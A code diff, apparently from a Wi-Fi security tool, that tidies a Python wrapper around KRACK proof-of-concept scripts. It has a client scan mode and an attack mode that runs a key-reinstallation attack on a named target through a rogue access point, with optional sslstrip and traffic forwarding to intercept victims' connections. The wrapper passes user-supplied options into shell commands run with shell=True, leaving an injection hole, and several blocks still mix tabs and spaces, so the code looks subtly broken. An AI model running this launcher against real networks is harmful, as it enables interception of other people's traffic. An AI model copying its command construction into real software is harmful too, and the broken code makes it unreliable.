@@ -77,48 +77,51 @@ def main():
         with open('./networkCredentials.txt', 'w') as netCredentials:
             if len(options.password) >= 8:
                 netCredentials.write(options.ssid + '\n' + options.password)
-	    else:
+            else:
                 log.warn("Password length has to be longer than 8 characters, try again or don't specify password; the default password is 'abcdefgh'.")
                 sys.exit()
-	
-	# Attempt to launch scan, write output to file and display parsed output on screen
+	    
+        # Attempt to launch scan, write output to file and display output on screen
         try:
             subprocess.call(["./prepareClientScan.sh"])
             log.info("Running KRACK+ Scan:")
             log.warn("Connect to '" + options.ssid + "' with '" + options.password + "' to scan devices.")
             log.warn("Wait for the scan to finish or press 'ctrl-c' to end/abort scan and generate PDF of current findings.")
       	    with open('./scanOutput.txt', 'w') as scanOutput:
-		if options.scan and options.debug:
+                if options.scan and options.debug:
                     subprocess.call(["./findVulnerable/krackattack/krack-test-client.py"], shell=True)
-		elif options.scan and options.dd:
+                elif options.scan and options.dd:
                     subprocess.call(["./findVulnerable/krackattack/krack-test-client.py --debug"], shell=True)
-		else:
+                else:
                     subprocess.call(["./findVulnerable/krackattack/krack-test-client.py &"], stdout=scanOutput, shell=True)
-            	    scanParser()
+                    scanParser()
                     raise KeyboardInterrupt 
                     
         except(KeyboardInterrupt, SystemExit):
-		subprocess.call(["clear"], shell=True)
-                with click.progressbar(range(50000), label="Cleaning up and generating PDF") as bar:
-                    for i in bar:
-                        pass
-                subprocess.call(["./restoreClientWifi.sh"])
-                writeResults()
-		if options.path:
-                	subprocess.call(["./genPDF.py " + options.path], shell=True)
-			log.info("PDF generated in '" + options.path + "'.")
-		else: 
-                	subprocess.call(["./genPDF.py " + path], shell=True)
-			log.info("PDF generated in '" + path + "'.")
-                subprocess.call(["rm scanOutput.txt"], shell=True)
-                subprocess.call(["rm scannedMacIP.txt"], shell=True)
-                subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
-                subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
-                
+            subprocess.call(["clear"], shell=True)
+            # Display a progress bar while the report generates 
+            with click.progressbar(range(25000), label="Cleaning up and generating PDF") as bar:
+                for i in bar:
+                    pass
+            subprocess.call(["./restoreClientWifi.sh"])
+            writeResults()
+            # Generates report of results in user-supplied or default location and tells user where it is
+            if options.path:
+                subprocess.call(["./genPDF.py " + options.path], shell=True)
+                log.info("PDF generated in '" + options.path + "'.")		    
+            else: 
+                subprocess.call(["./genPDF.py " + path], shell=True)
+                log.info("PDF generated in '" + path + "'.")
+            # Removes temporary files
+            subprocess.call(["rm scanOutput.txt"], shell=True)
+            subprocess.call(["rm scannedMacIP.txt"], shell=True)
+            subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
+            subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
+                    
         #except:
-         #   log.error("Error occurred.")
-          #  log.info("Restoring internet connection.")
-           # subprocess.call(["./restoreClientWifi.sh"])
+        #    log.error("Error occurred.")
+        #    log.info("Restoring internet connection.")
+        #    subprocess.call(["./restoreClientWifi.sh"])
 
 
     ############# ATTACK ################
@@ -126,57 +129,63 @@ def main():
         try:
             print("Performing key reinstallation attack")
 
-            #Sets up dependencies before the attack script runs
+            # Sets up dependencies before the attack script runs
             subprocess.call(["./prepareClientAttack.sh"])         
             with open('./attackOutput.txt', 'w') as attackOutput:
-		
-		# Gives error if user attempts to combine pcap option with either debugging option.
-		if options.pcap and (options.dd or options.debug):		
-			raise KeyboardInterrupt("ERROR: cannot combine pcap with -d or --dd")
-			
+
+		        # Gives error if user attempts to combine pcap option with either debugging option.
+                if options.pcap and (options.dd or options.debug):		
+			        raise KeyboardInterrupt("ERROR: cannot combine pcap with -d or --dd")
+			        
                 # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
-		elif options.dd:
-			# Runs attack with debug enabled
-		        subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-		                         options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
-			
-		elif options.pcap:
-			# TODO Verify that this file is moved and contains useful information 
-			# Saves pcap from attack to file. 
-			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-                                 options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
-			source=os.listdir("krackattacks-poc-zerokey/krackattack/")
-			destination="reports/"
-                        subprocess.call(["mv " + "krackattacks-poc-zerokey/krackattack/" + "*pcap " + destination], shell=True)
+                elif options.dd:
+		            # Runs attack with debug enabled
+		            subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+		                                 options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
+		        
+                # Saves pcap from attack to file and moves it to the reports folder 
+                elif options.pcap:	 
+                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                                         options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
+                    source=os.listdir("krackattacks-poc-zerokey/krackattack/")
+                    destination="reports/"
+                    subprocess.call(["mv " + "krackattacks-poc-zerokey/krackattack/" + "*pcap " + destination], shell=True)
 
                 elif options.sslstrip:
                     subprocess.Popen(["sslstrip -w sslstrip.log &"], shell=True)
 
-		else: 
-			subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-                
-                subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
-                
-		log.info("Open Wireshark to see traffic")
-		# User will only see relevant output, unless debug is on
-		if options.debug:
-			log.info("Debug enabled")
-		else:            	
-			attackParser()
+                else:
+                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                                         options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
+                        
+                    subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
+                        
+                log.info("Open Wireshark to see traffic")
+		        # User will only see relevant output, unless debug is on
+                if options.debug:
+			        log.info("Debug enabled")
+                else:            	
+			        attackParser()
 
-        except KeyboardInterrupt, e:
-   	    subprocess.call(["clear"], shell=True)
-	    log.error(e)
+        except KeyboardInterrupt:
+       	    subprocess.call(["clear"], shell=True)
             log.info("Cleaning up and restoring wifi ...")
-	    subprocess.call(["rm attackOutput.txt"], shell=True)
+            subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
+            subprocess.call(["./killProcesses.sh dnsmasq"], shell=True) 
+            if options.sslstrip:
+                subprocess.call(["./killProcesses.sh sslstrip"], shell=True) 
 
-	except:
-	    subprocess.call(["clear"], shell=True)
+        except:
+            subprocess.call(["clear"], shell=True)
             log.error("Error occurred. Restoring wifi ...")
             subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
+            # Kills dnsmasq and sslstrip (if user used the sslstrip option)
+            subprocess.call(["./killProcesses.sh dnsmasq"], shell=True) 
+            if options.sslstrip:
+                subprocess.call(["./killProcesses.sh sslstrip"], shell=True) 
+
 
     ############# RESTORE INTERNET ################        
     elif options.restore:
